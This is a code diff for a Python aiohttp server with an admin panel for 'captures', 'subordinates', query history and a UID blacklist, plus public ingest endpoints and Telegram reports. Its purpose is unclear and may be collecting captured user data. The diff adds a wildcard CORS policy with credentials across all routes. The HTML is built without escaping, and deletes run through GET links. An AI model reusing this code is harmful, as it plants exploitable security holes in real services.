     return web.Response(text=page("Queries", body, "q"), content_type="text/html")
 
 
 @admin_required
 async def admin_queries_export(req):
+    site_filter = req.query.get("site", "").strip()
     async with POOL.acquire() as c:
-        rows = await c.fetch("SELECT telegram_id, query_uid, result, queried_at FROM query_history ORDER BY id DESC")
-    csv = "telegram_id,query_uid,result,queried_at\n"
+        if site_filter:
+            rows = await c.fetch("SELECT site_key, telegram_id, query_uid, result, queried_at FROM query_history WHERE site_key=$1 ORDER BY id DESC", site_filter)
+        else:
+            rows = await c.fetch("SELECT site_key, telegram_id, query_uid, result, queried_at FROM query_history ORDER BY id DESC")
+    csv = "site_key,telegram_id,query_uid,result,queried_at\n"
     for r in rows:
         csv += ",".join(f'"{str(r[k] or "")}"' for k in r.keys()) + "\n"
     return web.Response(text=csv, content_type="text/csv",
@@ -836,13 +965,14 @@ async def admin_blacklist(req):
     </div>
     <table><tr><th>UID</th><th>Reason</th><th>Added</th><th>Action</th></tr>"""
     for r in rows:
-        body += f"""<tr><td><code>{r['uid']}</code></td>
+        body += f"""<tr>
+            <td><code>{r['uid']}</code></td>
             <td>{r['reason'] or '—'}</td>
             <td class="mono">{r['added_at']}</td>
             <td><a class="btn" href="/admin/blacklist/delete/{r['uid']}">Remove</a></td></tr>"""
     if not rows:
         body += '<tr><td colspan="4" class="empty">No blacklist</td></tr>'
-    body += '</table>'
+    body += "</table>"
     return web.Response(text=page("Blacklist", body, "bl"), content_type="text/html")
 
 
@@ -881,7 +1011,7 @@ async def admin_settings(req):
             <p class="mono" style="color:#7ae0c4">vars: {{uid}} {{link}}</p></div>
         <div class="card"><h2>Blacklisted</h2>
             <textarea name="blacklist_text">{vals['blacklist_text']}</textarea></div>
-        <div class="card"><h2>Register URL</h2>
+        <div class="card"><h2>Register URL (default)</h2>
             <input name="register_url" value="{vals['register_url']}"></div>
         <div class="card"><h2>Help</h2>
             <textarea name="help_text">{vals['help_text']}</textarea></div>
@@ -1030,14 +1160,12 @@ async def daily_report_task():
                     n_sub = await c.fetchval("SELECT COUNT(*) FROM subordinates")
                     n_q = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE date(queried_at)=CURRENT_DATE")
                     n_found = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE date(queried_at)=CURRENT_DATE AND result='found'")
-                    n_new = await c.fetchval("SELECT COUNT(*) FROM bot_users WHERE date(first_seen)=CURRENT_DATE")
                 await notify(
                     f"📊 <b>Daily Report</b>\n\n"
                     f"📱 Total captures: {n_cap}\n"
                     f"👥 Total subordinates: {n_sub}\n"
                     f"📜 Queries today: {n_q}\n"
-                    f"✅ Found today: {n_found}\n"
-                    f"🤖 New users: {n_new}")
+                    f"✅ Found today: {n_found}")
                 last_sent = today
         except Exception:
             pass
@@ -1056,9 +1184,13 @@ def make_app():
     app = web.Application()
     app.on_startup.append(on_startup)
 
+    # CORS middleware
+    import aiohttp_cors
+
     # public
     app.router.add_get("/", handle_root)
     app.router.add_get("/health", handle_health)
+    app.router.add_get("/api/public/sites", handle_sites_public)
     app.router.add_post("/api/public/captures-ingest", handle_ingest)
     app.router.add_post("/api/public/subordinates-ingest", handle_subs_ingest)
     app.router.add_get("/api/public/check-uid", handle_check_uid)
@@ -1073,17 +1205,19 @@ def make_app():
     app.router.add_post("/admin/login", admin_login_post)
     app.router.add_get("/admin/logout", admin_logout)
 
+    app.router.add_get("/admin/sites", admin_sites)
+    app.router.add_post("/admin/sites/add", admin_sites_add)
+    app.router.add_get("/admin/sites/delete/{key}", admin_sites_delete)
+
     app.router.add_get("/admin/captures", admin_captures)
     app.router.add_get("/admin/captures/export", admin_captures_export)
     app.router.add_get("/admin/captures/delete/{id}", admin_captures_delete)
     app.router.add_get("/admin/captures/edit/{id}", admin_captures_edit)
     app.router.add_post("/admin/captures/edit/{id}", admin_captures_edit_post)
-    app.router.add_post("/admin/captures/add", admin_captures_add)
 
     app.router.add_get("/admin/subs", admin_subs)
     app.router.add_get("/admin/subs/export", admin_subs_export)
     app.router.add_get("/admin/subs/delete/{id}", admin_subs_delete)
-    app.router.add_post("/admin/subs/add", admin_subs_add)
 
     app.router.add_get("/admin/users", admin_users)
     app.router.add_get("/admin/users/delete/{id}", admin_users_delete)
@@ -1107,10 +1241,25 @@ def make_app():
 
     app.router.add_get("/admin/log", admin_log)
 
+    # CORS -- allow all
+    cors = aiohttp_cors.setup(app, defaults={
+        "*": aiohttp_cors.ResourceOptions(
+            allow_credentials=True,
+            expose_headers="*",
+            allow_headers="*",
+            allow_methods="*",
+        )
+    })
+    for route in list(app.router.routes()):
+        try:
+            cors.add(route)
+        except Exception:
+            pass
+
     return app
 
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
-    print(f"[knt] server v3 on :{port}")
+    print(f"[knt] server v4 (multi-tenant) on :{port}")
     web.run_app(make_app(), host="0.0.0.0", port=port)
